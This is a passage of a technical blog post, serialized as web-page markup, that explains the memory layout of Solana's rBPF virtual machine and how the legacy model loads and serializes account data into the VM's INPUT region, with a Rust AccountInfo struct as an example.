react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[3]}],[\"$\",\"span\",\"code-segement30\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement31\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x300000000\"]}],[\"$\",\"span\",\"code-segement32\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement33\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"-\"]}],[\"$\",\"span\",\"code-segement34\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement35\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"HEAP\"]}],[\"$\",\"span\",\"code-segement36\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"     \"]}],[\"$\",\"span\",\"code-segement37\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement38\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement39\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Dynamic\"]}],[\"$\",\"span\",\"code-segement40\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement41\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"memory\"]}],[\"$\",\"span\",\"code-segement42\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement43\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement44\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"32KB region\"]}],[\"$\",\"span\",\"code-segement45\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement46\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[4]}],[\"$\",\"span\",\"code-segement48\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement49\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0x400000000\"]}],[\"$\",\"span\",\"code-segement50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement51\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"-\"]}],[\"$\",\"span\",\"code-segement52\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement53\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"INPUT\"]}],[\"$\",\"span\",\"code-segement54\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement55\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement56\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement57\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Program\"]}],[\"$\",\"span\",\"code-segement58\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" input parameters \"]}],[\"$\",\"span\",\"code-segement59\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement60\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" serialized account data\"]}]]]}]}]}],\"\\n\",[\"$\",\"p\",\"p-19\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"Within the VM, during execution, programs can modify their own memory however they want without affecting the memory stored on the host. All validation is checked after the program execution completes.\"}],\"\\n\",[\"$\",\"h2\",\"h2-3\",{\"className\":\"text-4xl py-4 border-b border-white/10\",\"children\":\"The Legacy Model: Single Program Execution (~v1.14.x)\"}],\"\\n\",[\"$\",\"p\",\"p-20\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"Let's first understand how a simple program execution flows in the legacy model. This process involves four main phases: loading accounts from the database, executing bytecode in the rBPF VM, validating changes to guarantee integrity, and committing the results to storage.\"}],\"\\n\",[\"$\",\"p\",\"p-21\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"/blog/2025_06_27/single_program_memory_layout.png\",\"alt\":\"Single Program Memory Layout\"}]}],\"\\n\",[\"$\",\"p\",\"p-22\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"As shown in the diagram above, the legacy model serializes all account data into a contiguous \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"INPUT\"}],\" region. Here's how this process works:\"]}],\"\\n\",[\"$\",\"h3\",\"h3-3\",{\"className\":\"text-3xl py-4 border-b border-white/10\",\"children\":\"Phase 1: Loading and Serializing Accounts\"}],\"\\n\",[\"$\",\"p\",\"p-23\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"The host and VM operate in completely isolated environments, they can't share objects or pointers directly. All account data must cross this boundary through serialization and deserialization, creating a controlled interface between the trusted host and the sandboxed VM.\"}],\"\\n\",[\"$\",\"p\",\"p-24\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"The validator loads all requested accounts from the database and serializes them into a binary blob that gets copied into the \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"INPUT\"}],\" region at \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"0x400000000\"}],\". Once inside the VM, programs usually start by deserializing the raw serialized \",[\"$\",\"code\",\"code-2\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"Accounts\"}],\" into \",[\"$\",\"code\",\"code-3\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountInfo\"}],\" structures in its bootstrap routine\",[\"$\",\"mjx-container\",\"mjx-container-0\",{\"className\":\"MathJax\",\"jax\":\"SVG\",\"children\":[\"$\",\"svg\",\"svg-0\",{\"style\":{\"verticalAlign\":\"0\"},\"xmlns\":\"http://www.w3.org/2000/svg\",\"width\":\"0.988ex\",\"height\":\"1.887ex\",\"role\":\"img\",\"focusable\":\"false\",\"viewBox\":\"0 -833.9 436.6 833.9\",\"xmlnsXlink\":\"http://www.w3.org/1999/xlink\",\"children\":[[\"$\",\"defs\",\"defs-0\",{\"children\":[\"$\",\"path\",\"path-0\",{\"id\":\"MJX-1-TEX-N-31\",\"d\":\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"}]}],[\"$\",\"g\",\"g-0\",{\"stroke\":\"currentColor\",\"fill\":\"currentColor\",\"strokeWidth\":\"0\",\"transform\":\"scale(1,-1)\",\"children\":[\"$\",\"g\",\"g-0\",{\"data-mml-node\":\"math\",\"children\":[\"$\",\"g\",\"g-0\",{\"data-mml-node\":\"msup\",\"children\":[[\"$\",\"g\",\"g-0\",{\"data-mml-node\":\"mi\"}],[\"$\",\"g\",\"g-1\",{\"data-mml-node\":\"mn\",\"transform\":\"translate(33,363) scale(0.707)\",\"children\":[\"$\",\"use\",\"use-0\",{\"data-c\":\"31\",\"xlinkHref\":\"#MJX-1-TEX-N-31\"}]}]]}]}]}]]}]}],\". The \",[\"$\",\"code\",\"code-4\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountInfo\"}],\" are stored in the VM's heap memory before handing control to the program entrypoint function:\"]}],\"\\n\",[\"$\",\"pre\",\"pre-3\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"rounded-sm\",\"style\":{\"color\":\"#ccc\",\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#ccc\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[1]}],[\"$\",\"span\",\"code-segement1\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// How programs reconstruct AccountInfo from the serialized data\"]}],[\"$\",\"span\",\"code-segement2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[2]}],[\"$\",\"span\",\"code-segement4\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement5\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement7\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"struct\"]}],[\"$\",\"span\",\"code-segement8\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement9\",{\"className\":\"token token type-definition\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccountInfo\"]}],[\"$\",\"span\",\"code-segement10\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement11\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}],[\"$\",\"span\",\"code-segement12\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement13\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement14\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement15\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[3]}],[\"$\",\"span\",\"code-segement17\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement18\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement19\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" key\"]}],[\"$\",\"span\",\"code-segement20\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement21\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement22\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement23\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}],[\"$\",\"span\",\"code-segement24\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement25\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Pubkey\"]}],[\"$\",\"span\",\"code-segement26\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement27\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[4]}],[\"$\",\"span\",\"code-segement29\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement30\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement31\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" lamports\"]}],[\"$\",\"span\",\"code-segement32\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement33\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement34\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Rc\"]}],[\"$\",\"span\",\"code-segement35\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement36\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RefCell\"]}],[\"$\",\"span\",\"code-segement37\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement38\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement39\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}],[\"$\",\"span\",\"code-segement40\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement41\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement42\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement43\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement44\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}],[\"$\",\"span\",\"code-segement45\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement46\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[5]}],[\"$\",\"span\",\"code-segement48\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement49\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" data\"]}],[\"$\",\"span\",\"code-segement51\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement52\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement53\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Rc\"]}],[\"$\",\"span\",\"code-segement54\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement55\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RefCell\"]}],[\"$\",\"span\",\"code-segement56\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement57\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement58\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}],[\"$\",\"span\",\"code-segement59\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement60\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement61\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement62\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement63\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}],[\"$\",\"span\",\"code-segement64\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement65\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}],[\"$\",\"span\",\"code-segement66\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement67\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"  \"]}],[\"$\",\"span\",\"code-segement68\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Points directly into INPUT region!\"]}],[\"$\",\"span\",\"code-segement69\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[6]}],[\"$\",\"span\",\"code-segement71\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement72\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement73\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" owner\"]}],[\"$\",\"span\",\"code-segement74\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement75\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement76\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement77\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}],[\"$\",\"span\",\"code-segement78\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement79\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Pubkey\"]}],[\"$\",\"span\",\"code-segement80\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement81\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[7]}],[\"$\",\"span\",\"code-segement83\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement84\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement85\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" rent_epoch\"]}],[\"$\",\"span\",\"code-segement86\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement87\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement88\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Epoch\"]}],[\"$\",\"span\",\"code-segement89\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement90\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[8]}],[\"$\",\"span\",\"code-segement92\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement93\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement94\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" is_signer\"]}],[\"$\",\"span\",\"code-segement95\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement96\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement97\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"bool\"]}],[\"$\",\"span\",\"code-segement98\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement99\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[9]}],[\"$\",\"span\",\"code-segement101\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement102\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement103\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" is_writable\"]}],[\"$\",\"span\",\"code-segement104\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement105\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement106\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"bool\"]}],[\"$\",\"span\",\"code-segement107\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement108\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--10\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[10]}],[\"$\",\"span\",\"code-segement110\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement111\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement112\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" executable\"]}],[\"$\",\"span\",\"code-segement113\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement114\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement115\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"bool\"]}],[\"$\",\"span\",\"code-segement116\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement117\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[11]}],[\"$\",\"span\",\"code-segement119\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement120\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]]]}]}]}],\"\\n\",[\"$\",\"p\",\"p-25\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountInfo.data\"}],\" points directly into the serialized representation within the \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"INPUT\"}],\" region. For instance, if a program writes \",[\"$\",\"code\",\"code-2\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"account.data.borrow_mut()[0] = 42\"}],\", it's modifying the serialized data in VM memory.\"]}],\"\\n\",[\"$\",\"p\",\"p-26\",{\"className\":\"text-xl py-3 text-pretty 